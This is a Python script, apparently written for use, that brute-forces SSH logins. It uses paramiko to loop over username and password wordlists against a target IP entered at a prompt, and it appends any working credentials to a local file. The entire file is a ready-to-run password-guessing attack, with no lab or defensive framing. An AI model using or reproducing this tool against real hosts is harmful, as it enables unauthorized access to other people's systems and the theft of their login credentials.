import paramiko
import os
import socket
import time

def ssh_brute_force(hostname, user_file, pass_file):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    if not os.path.exists(user_file) or not os.path.exists(pass_file):
        print("[-] Error: User or Password file not found")
        return

    try:
        with open(user_file, 'r', encoding='utf-8', errors='ignore') as users, \
             open(pass_file, 'r', encoding='utf-8', errors='ignore') as passwords:
            
            user_list = [u.strip() for u in users.readlines()]
            pass_list = [p.strip() for p in passwords.readlines()]

        for username in user_list:
            for password in pass_list:
                try:
                    print(f"[*] Trying {username}:{password}")
                    client.connect(hostname, username=username, password=password, timeout=3)
                    
                    print(f"\n[+] Success! Found credentials: {username}:{password}\n")
                    
                    with open("found_creds.txt", "a") as f:
                        f.write(f"{hostname} -> {username}:{password}\n")
                    
                    client.close()
                    return
                
                except paramiko.AuthenticationException:
                    continue
                except (paramiko.SSHException, socket.error) as e:
                    print(f"[-] Connection failed or refused by {hostname}. Retrying...")
                    time.sleep(1)
                    continue
                    
    except Exception as e:
        print(f"[-] An unexpected error occurred: {e}")

if __name__ == "__main__":
    target = input("[+] Enter Target IP: ").strip()
    u_file = input("[+] Enter Users wordlist path: ").strip()
    p_file = input("[+] Enter Passwords wordlist path: ").strip()

    ssh_brute_force(target, u_file, p_file)

